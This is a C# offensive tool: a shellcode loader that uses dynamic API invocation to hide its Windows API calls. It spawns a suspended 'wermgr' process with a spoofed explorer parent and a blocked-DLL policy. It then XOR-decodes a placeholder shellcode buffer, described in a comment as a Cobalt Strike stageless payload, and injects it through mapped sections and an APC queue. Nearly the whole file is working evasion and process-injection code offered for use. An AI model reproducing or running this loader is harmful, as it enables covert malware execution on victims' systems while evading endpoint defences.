// Go to properties -> build -> uncheck "Optimize Code"
// Credit to RastaMouse

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace TestAssembly
{
    public class Program
    {

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        private const int MITIGATION_POLICY = 0x20007;
        private const int PARENT_PROCESS = 0x00020000;
        private const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;

        private const uint CREATE_SUSPENDED = 0x00000004;
        private const uint DETACHED_PROCESS = 0x00000008;
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private const uint EXTENDED_STARTUP_INFO_PRESENT = 0x00080000;

        private const uint GENERIC_ALL = 0x10000000;
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint SEC_COMMIT = 0x08000000;

        public static void Main()
        {
            
            var startupInfoEx = new DInvoke.STARTUPINFOEX();
            startupInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startupInfoEx);

            _ = DInvoke.InitializeProcThreadAttributeList(ref startupInfoEx.lpAttributeList, 2);

            var blockDllPtr = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(blockDllPtr, new IntPtr(BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));

            _ = DInvoke.UpdateProcThreadAttribute(
                ref startupInfoEx.lpAttributeList,
                (IntPtr)MITIGATION_POLICY,
                ref blockDllPtr);

            var ppidPtr = Marshal.AllocHGlobal(IntPtr.Size);
            var hParent = Process.GetProcessesByName("explorer")[0].Handle;
            Marshal.WriteIntPtr(ppidPtr, hParent);

            _ = DInvoke.UpdateProcThreadAttribute(
                ref startupInfoEx.lpAttributeList,
                (IntPtr)PARENT_PROCESS,
                ref ppidPtr);

            var processInfo = new DInvoke.PROCESS_INFORMATION();
            _ = DInvoke.CreateProcess(
                null,
                "wermgr",
                CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS | EXTENDED_STARTUP_INFO_PRESENT,
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                ref startupInfoEx,
                out processInfo);

            DInvoke.DeleteProcThreadAttributeList(ref startupInfoEx.lpAttributeList);
            Marshal.FreeHGlobal(ppidPtr);
            Marshal.FreeHGlobal(blockDllPtr);

            byte[] shellcode = new byte[263171] {"SHELLCODE HERE"}; // Cobalt Strike stageless is ~260k

            // Decode with 0xfa as the key
            for (int i = 0; i < shellcode.Length; i++)
            {
                shellcode[i] = (byte)((uint)shellcode[i] ^ 0xfa);
            }

            var hLocalSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;
            

            _ = DInvoke.NtCreateSection(
                ref hLocalSection,
                GENERIC_ALL,
                IntPtr.Zero,
                ref maxSize,
                PAGE_EXECUTE_READWRITE,
                SEC_COMMIT,
                IntPtr.Zero);

            var self = Process.GetCurrentProcess();
            var hLocalBaseAddress = IntPtr.Zero;
            
            _ = DInvoke.NtMapViewOfSection(
                hLocalSection,
                self.Handle,
                ref hLocalBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                ref maxSize,
                2,
                0,
                PAGE_READWRITE);

            var hRemoteBaseAddress = IntPtr.Zero;

            _ = DInvoke.NtMapViewOfSection(
                hLocalSection,
                processInfo.hProcess,
                ref hRemoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                ref maxSize,
                2,
                0,
                PAGE_EXECUTE_READ);
            
            Marshal.Copy(shellcode, 0, hLocalBaseAddress, shellcode.Length);

            _ = DInvoke.NtQueueApcThread(
                processInfo.hThread,
                hRemoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);
            
             _ = DInvoke.NtResumeThread(processInfo.hThread);

  
        }
    }

    public static class DInvoke
    {
        private static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters, bool CanLoadFromDisk = false, bool ResolveForwards = true)
        {
            var pFunction = GetLibraryAddress(DLLName, FunctionName, CanLoadFromDisk, ResolveForwards);
            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
        }
        
        private static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
        {
            var funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }

        private static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false, bool ResolveForwards = true)
        {
            var hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero && CanLoadFromDisk)
            {
                hModule = LoadModuleFromDisk(DLLName);
                if (hModule == IntPtr.Zero)
                {
                    throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
                }
            }
            else if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName, ResolveForwards);
        }
        
        private static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            var ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }
        
        private static IntPtr LoadModuleFromDisk(string DLLPath)
        {
            var uModuleName = new UNICODE_STRING();
            RtlInitUnicodeString(ref uModuleName, DLLPath);

            var hModule = IntPtr.Zero;
            var CallResult = LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);

            return hModule;
        }
        
        private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, bool ResolveForwards = true)
        {
            var FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                var PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                var OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                var OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                var Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                long pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                var ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                var OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                var NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                var NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                var FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                var NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                var OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Get the VAs of the name table's beginning and end.
                var NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
                var NamesFinal = NamesBegin + NumberOfNames * 4;

                // Loop the array of export name RVA's
                for (var i = 0; i < NumberOfNames; i++)
                {
                    var FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {

                        var FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        var FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((long)ModuleBase + FunctionRVA);
                        
                        if (ResolveForwards == true)
                            // If the export address points to a forward, get the address
                            FunctionPtr = GetForwardAddress(FunctionPtr);

                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }
        
        private static IntPtr GetPebLdrModuleEntry(string DLLName)
        {
            // Get _PEB pointer
            var pbi = NtQueryInformationProcessBasicInformation((IntPtr)(-1));

            // Set function variables
            uint LdrDataOffset = 0;
            uint InLoadOrderModuleListOffset = 0;
            if (IntPtr.Size == 4)
            {
                LdrDataOffset = 0xc;
                InLoadOrderModuleListOffset = 0xC;
            }
            else
            {
                LdrDataOffset = 0x18;
                InLoadOrderModuleListOffset = 0x10;
            }

            // Get module InLoadOrderModuleList -> _LIST_ENTRY
            var PEB_LDR_DATA = Marshal.ReadIntPtr((IntPtr)((ulong)pbi.PebBaseAddress + LdrDataOffset));
            var pInLoadOrderModuleList = (IntPtr)((ulong)PEB_LDR_DATA + InLoadOrderModuleListOffset);
            var le = (LIST_ENTRY)Marshal.PtrToStructure(pInLoadOrderModuleList, typeof(LIST_ENTRY));

            // Loop entries
            var flink = le.Flink;
            var hModule = IntPtr.Zero;
            var dte = (LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(LDR_DATA_TABLE_ENTRY));
            while (dte.InLoadOrderLinks.Flink != le.Blink)
            {
                // Match module name
                if (Marshal.PtrToStringUni(dte.FullDllName.Buffer).EndsWith(DLLName, StringComparison.OrdinalIgnoreCase))
                {
                    hModule = dte.DllBase;
                }
            
                // Move Ptr
                flink = dte.InLoadOrderLinks.Flink;
                dte = (LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(LDR_DATA_TABLE_ENTRY));
            }

            return hModule;
        }
        
        private static IntPtr GetForwardAddress(IntPtr ExportAddress, bool CanLoadFromDisk = false)
        {
            var FunctionPtr = ExportAddress;
            try
            {
                // Assume it is a forward. If it is not, we will get an error
                var ForwardNames = Marshal.PtrToStringAnsi(FunctionPtr);
                var values = ForwardNames.Split('.');

                if (values.Length > 1)
                {
                    var ForwardModuleName = values[0];
                    var ForwardExportName = values[1];

                    // Check if it is an API Set mapping
                    var ApiSet = GetApiSetMapping();
                    var LookupKey = ForwardModuleName.Substring(0, ForwardModuleName.Length - 2) + ".dll";
                    if (ApiSet.ContainsKey(LookupKey))
                        ForwardModuleName = ApiSet[LookupKey];
                    else
                        ForwardModuleName = ForwardModuleName + ".dll";

                    var hModule = GetPebLdrModuleEntry(ForwardModuleName);
                    if (hModule == IntPtr.Zero && CanLoadFromDisk == true)
                        hModule = LoadModuleFromDisk(ForwardModuleName);
                    if (hModule != IntPtr.Zero)
                    {
                        FunctionPtr = GetExportAddress(hModule, ForwardExportName);
                    }
                }
            }
            catch
            {
                // Do nothing, it was not a forward
            }
            return FunctionPtr;
        }
        
        private static Dictionary<string, string> GetApiSetMapping()
        {
            var pbi = NtQueryInformationProcessBasicInformation((IntPtr)(-1));
            var ApiSetMapOffset = IntPtr.Size == 4 ? (uint)0x38 : 0x68;

            // Create mapping dictionary
            var ApiSetDict = new Dictionary<string, string>();

            var pApiSetNamespace = Marshal.ReadIntPtr((IntPtr)((ulong)pbi.PebBaseAddress + ApiSetMapOffset));
            var Namespace = (ApiSetNamespace)Marshal.PtrToStructure(pApiSetNamespace, typeof(ApiSetNamespace));
            for (var i = 0; i < Namespace.Count; i++)
            {
                var SetEntry = new ApiSetNamespaceEntry();
                var pSetEntry = (IntPtr)((ulong)pApiSetNamespace + (ulong)Namespace.EntryOffset + (ulong)(i * Marshal.SizeOf(SetEntry)));
                SetEntry = (ApiSetNamespaceEntry)Marshal.PtrToStructure(pSetEntry, typeof(ApiSetNamespaceEntry));

                var ApiSetEntryName = Marshal.PtrToStringUni((IntPtr)((ulong)pApiSetNamespace + (ulong)SetEntry.NameOffset), SetEntry.NameLength/2);
                var ApiSetEntryKey = ApiSetEntryName.Substring(0, ApiSetEntryName.Length - 2) + ".dll" ; // Remove the patch number and add .dll

                var SetValue = new ApiSetValueEntry();

                var pSetValue = IntPtr.Zero;

                // If there is only one host, then use it
                if (SetEntry.ValueLength == 1)
                    pSetValue = (IntPtr)((ulong)pApiSetNamespace + (ulong)SetEntry.ValueOffset);
                else if (SetEntry.ValueLength > 1)
                {
                    // Loop through the hosts until we find one that is different from the key, if available
                    for (var j = 0; j < SetEntry.ValueLength; j++)
                    {
                        var host = (IntPtr)((ulong)pApiSetNamespace + (ulong)SetEntry.ValueOffset + (ulong)Marshal.SizeOf(SetValue) * (ulong)j);
                        if (Marshal.PtrToStringUni(host) != ApiSetEntryName)
                            pSetValue = (IntPtr)((ulong)pApiSetNamespace + (ulong)SetEntry.ValueOffset + (ulong)Marshal.SizeOf(SetValue) * (ulong)j);
                    }
                    // If there is not one different from the key, then just use the key and hope that works
                    if (pSetValue == IntPtr.Zero)
                        pSetValue = (IntPtr)((ulong)pApiSetNamespace + (ulong)SetEntry.ValueOffset);
                }

                //Get the host DLL's name from the entry
                SetValue = (ApiSetValueEntry)Marshal.PtrToStructure(pSetValue, typeof(ApiSetValueEntry));
                var ApiSetValue = string.Empty;
                if (SetValue.ValueCount != 0)
                {
                    var pValue = (IntPtr)((ulong)pApiSetNamespace + (ulong)SetValue.ValueOffset);
                    ApiSetValue = Marshal.PtrToStringUni(pValue, SetValue.ValueCount/2);
                }

                // Add pair to dict
                ApiSetDict.Add(ApiSetEntryKey, ApiSetValue);
            }

            // Return dict
            return ApiSetDict;
        }
        
        private static void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
        {
            object[] funcargs = { DestinationString, SourceString };
            DynamicAPIInvoke(@"ntdll.dll", @"RtlInitUnicodeString", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);
            DestinationString = (UNICODE_STRING)funcargs[0];
        }
        
        private static uint LdrLoadDll(IntPtr PathToFile, uint dwFlags, ref UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
        {
            object[] funcargs = { PathToFile, dwFlags, ModuleFileName, ModuleHandle };
            var retValue = (uint)DynamicAPIInvoke(@"ntdll.dll", @"LdrLoadDll", typeof(DELEGATES.LdrLoadDll), ref funcargs);
            ModuleHandle = (IntPtr)funcargs[3];

            return retValue;
        }
        
        private static PROCESS_BASIC_INFORMATION NtQueryInformationProcessBasicInformation(IntPtr hProcess)
        {
            var retValue = NtQueryInformationProcess(hProcess, PROCESSINFOCLASS.ProcessBasicInformation, out var pProcInfo);
            return (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pProcInfo, typeof(PROCESS_BASIC_INFORMATION));
        }
        
        private static uint NtQueryInformationProcess(IntPtr hProcess, PROCESSINFOCLASS processInfoClass, out IntPtr pProcInfo)
        {
            int processInformationLength;
            uint RetLen = 0;

            switch (processInfoClass)
            {
                case PROCESSINFOCLASS.ProcessWow64Information:
                    pProcInfo = Marshal.AllocHGlobal(IntPtr.Size);
                    RtlZeroMemory(pProcInfo, IntPtr.Size);
                    processInformationLength = IntPtr.Size;
                    break;
                
                case PROCESSINFOCLASS.ProcessBasicInformation:
                    var PBI = new PROCESS_BASIC_INFORMATION();
                    pProcInfo = Marshal.AllocHGlobal(Marshal.SizeOf(PBI));
                    RtlZeroMemory(pProcInfo, Marshal.SizeOf(PBI));
                    Marshal.StructureToPtr(PBI, pProcInfo, true);
                    processInformationLength = Marshal.SizeOf(PBI);
                    break;
                default:
                    throw new InvalidOperationException("Invalid ProcessInfoClass: {processInfoClass}");
            }

            object[] funcargs = { hProcess, processInfoClass, pProcInfo, processInformationLength, RetLen };

            var retValue = (uint)DynamicAPIInvoke(@"ntdll.dll", @"NtQueryInformationProcess", typeof(DELEGATES.NtQueryInformationProcess), ref funcargs);
            pProcInfo = (IntPtr)funcargs[2];

            return retValue;
        }
        
        private static void RtlZeroMemory(IntPtr Destination, int Length)
        {
            object[] funcargs = { Destination, Length };
            DynamicAPIInvoke(@"ntdll.dll", @"RtlZeroMemory", typeof(DELEGATES.RtlZeroMemory), ref funcargs);
        }
        
        public static bool InitializeProcThreadAttributeList(ref IntPtr lpAttributeList, int dwAttributeCount)
        {
            var lpSize = IntPtr.Zero;
            object[] parameters = { IntPtr.Zero, dwAttributeCount, 0, lpSize };

            // always false at first, we need lpSize
            var retVal = (bool)DynamicAPIInvoke(@"kernel32.dll", @"InitializeProcThreadAttributeList", typeof(DELEGATES.InitializeProcThreadAttributeList), ref parameters);
            lpSize = (IntPtr)parameters[3];

            lpAttributeList = Marshal.AllocHGlobal(lpSize);
            parameters = new object[] { lpAttributeList, dwAttributeCount, 0, lpSize };
            retVal = (bool)DynamicAPIInvoke(@"kernel32.dll", @"InitializeProcThreadAttributeList", typeof(DELEGATES.InitializeProcThreadAttributeList), ref parameters);
            
            return retVal;
        }
        
        public static bool UpdateProcThreadAttribute(ref IntPtr lpAttributeList, IntPtr attribute, ref IntPtr lpValue)
        {
            object[] parameters = { lpAttributeList, (uint)0, attribute, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero };
            var retVal = (bool)DynamicAPIInvoke("kernel32.dll", "UpdateProcThreadAttribute", typeof(DELEGATES.UpdateProcThreadAttribute), ref parameters);
            return retVal;
        }
        
        public static bool CreateProcess(string lpApplicationName, string lpCommandLine, uint dwCreationFlags, string lpCurrentDirectory,
            ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)
        {
            var lpProcessAttributes = new SECURITY_ATTRIBUTES();
            var lpThreadAttributes= new SECURITY_ATTRIBUTES();
            
            lpProcessAttributes.nLength = (uint)Marshal.SizeOf(lpProcessAttributes);
            lpThreadAttributes.nLength = (uint)Marshal.SizeOf(lpThreadAttributes);

            object[] parameters = { lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, false,
                dwCreationFlags, IntPtr.Zero, lpCurrentDirectory, lpStartupInfo, null };

            var retVal = (bool)DynamicAPIInvoke("kernel32.dll", "CreateProcessA",
                typeof(DELEGATES.CreateProcessA), ref parameters);

            lpProcessInformation = (PROCESS_INFORMATION)parameters[9];
            return retVal;
        }

        public static void DeleteProcThreadAttributeList(ref IntPtr lpAttributeList)
        {
            object[] parameters = { lpAttributeList };
            DynamicAPIInvoke("kernel32.dll", "DeleteProcThreadAttributeList", typeof(DELEGATES.DeleteProcThreadAttributeList), ref parameters);
        }
        
        public static uint NtCreateSection(ref IntPtr hSection, uint desiredAccess, IntPtr objectAttributes, ref ulong maxSize,
            uint sectionPageProtection, uint allocationAttributes, IntPtr hFile)
        {
            object[] parameters = { hSection, desiredAccess, objectAttributes, maxSize, sectionPageProtection,
                allocationAttributes, hFile };

            var retValue = (uint)DynamicAPIInvoke(@"ntdll.dll", @"NtCreateSection", typeof(DELEGATES.NtCreateSection), ref parameters);

            hSection = (IntPtr) parameters[0];
            maxSize = (ulong) parameters[3];

            return retValue;
        }
        
        public static uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits,
            IntPtr CommitSize, IntPtr SectionOffset, ref ulong ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect)
        {
            object[] funcargs = { SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset,
                ViewSize, InheritDisposition, AllocationType, Win32Protect };

            var retValue = (uint)DynamicAPIInvoke(@"ntdll.dll", @"NtMapViewOfSection", typeof(DELEGATES.NtMapViewOfSection), ref funcargs);
            
            BaseAddress = (IntPtr) funcargs[2];
            ViewSize = (ulong) funcargs[6];

            return retValue;
        }
        
        public static uint NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3)
        {
            object[] parameters = { ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3 };
            return (uint)DynamicAPIInvoke(@"ntdll.dll", @"NtQueueApcThread", typeof(DELEGATES.NtQueueApcThread), ref parameters);
        }
        
        public static uint NtResumeThread(IntPtr ThreadHandle)
        {
            var suspendCount = (uint)0;
            object[] parameters = { ThreadHandle, suspendCount };
            return (uint)DynamicAPIInvoke(@"ntdll.dll", @"NtResumeThread", typeof(DELEGATES.NtResumeThread), ref parameters);
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }
        
        public enum PROCESSINFOCLASS : int
        {
            ProcessBasicInformation = 0, // 0, q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
            ProcessWow64Information, // q: ULONG_PTR
        };
        
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public UIntPtr UniqueProcessId;
            public int InheritedFromUniqueProcessId;

            public int Size
            {
                get { return (int)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)); }
            }
        }
        
        [StructLayout(LayoutKind.Explicit)]
        public struct ApiSetValueEntry
        {
            [FieldOffset(0x00)]
            public int Flags;

            [FieldOffset(0x04)]
            public int NameOffset;

            [FieldOffset(0x08)]
            public int NameCount;

            [FieldOffset(0x0C)]
            public int ValueOffset;

            [FieldOffset(0x10)]
            public int ValueCount;
        }
        
        [StructLayout(LayoutKind.Explicit)]
        public struct ApiSetNamespace
        {
            [FieldOffset(0x0C)]
            public int Count;

            [FieldOffset(0x10)]
            public int EntryOffset;
        }
        
        [StructLayout(LayoutKind.Explicit)]
        public struct ApiSetNamespaceEntry
        {
            [FieldOffset(0x04)]
            public int NameOffset;

            [FieldOffset(0x08)]
            public int NameLength;

            [FieldOffset(0x10)]
            public int ValueOffset;

            [FieldOffset(0x14)]
            public int ValueLength;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        public struct LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        public struct LDR_DATA_TABLE_ENTRY
        {
            public LIST_ENTRY InLoadOrderLinks;
            public LIST_ENTRY InMemoryOrderLinks;
            public LIST_ENTRY InInitializationOrderLinks;
            public IntPtr DllBase;
            public IntPtr EntryPoint;
            public uint SizeOfImage;
            public UNICODE_STRING FullDllName;
            public UNICODE_STRING BaseDllName;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        };
        
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        };
        
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        };
        
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public uint nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        };
        
        public struct DELEGATES
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void RtlInitUnicodeString(
                ref UNICODE_STRING DestinationString,
                [MarshalAs(UnmanagedType.LPWStr)]
                string SourceString);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint LdrLoadDll(
                IntPtr PathToFile,
                uint dwFlags,
                ref UNICODE_STRING ModuleFileName,
                ref IntPtr ModuleHandle);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtQueryInformationProcess(
                IntPtr processHandle,
                PROCESSINFOCLASS processInformationClass,
                IntPtr processInformation,
                int processInformationLength,
                ref uint returnLength);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void RtlZeroMemory(
                IntPtr Destination,
                int length);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool InitializeProcThreadAttributeList(
                IntPtr lpAttributeList,
                int dwAttributeCount,
                int dwFlags,
                ref IntPtr lpSize);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool UpdateProcThreadAttribute(
                IntPtr lpAttributeList,
                uint dwFlags,
                IntPtr attribute,
                IntPtr lpValue,
                IntPtr cbSize,
                IntPtr lpPreviousValue,
                IntPtr lpReturnSize);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool CreateProcessA(
                string lpApplicationName,
                string lpCommandLine,
                ref SECURITY_ATTRIBUTES lpProcessAttributes,
                ref SECURITY_ATTRIBUTES lpThreadAttributes,
                bool bInheritHandles,
                uint dwCreationFlags,
                IntPtr lpEnvironment,
                string lpCurrentDirectory,
                ref STARTUPINFOEX lpStartupInfo,
                out PROCESS_INFORMATION lpProcessInformation);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void DeleteProcThreadAttributeList(
                IntPtr lpAttributeList);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtCreateSection(
                ref IntPtr SectionHandle,
                uint DesiredAccess,
                IntPtr ObjectAttributes,
                ref ulong MaximumSize,
                uint SectionPageProtection,
                uint AllocationAttributes,
                IntPtr FileHandle);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtMapViewOfSection(
                IntPtr SectionHandle,
                IntPtr ProcessHandle,
                out IntPtr BaseAddress,
                IntPtr ZeroBits,
                IntPtr CommitSize,
                IntPtr SectionOffset,
                out ulong ViewSize,
                uint InheritDisposition,
                uint AllocationType,
                uint Win32Protect);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtQueueApcThread(
                IntPtr ThreadHandle,
                IntPtr ApcRoutine,
                IntPtr ApcArgument1,
                IntPtr ApcArgument2,
                IntPtr ApcArgument3);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtResumeThread(
                IntPtr ThreadHandle,
                ref uint SuspendCount);
        }
    }
}
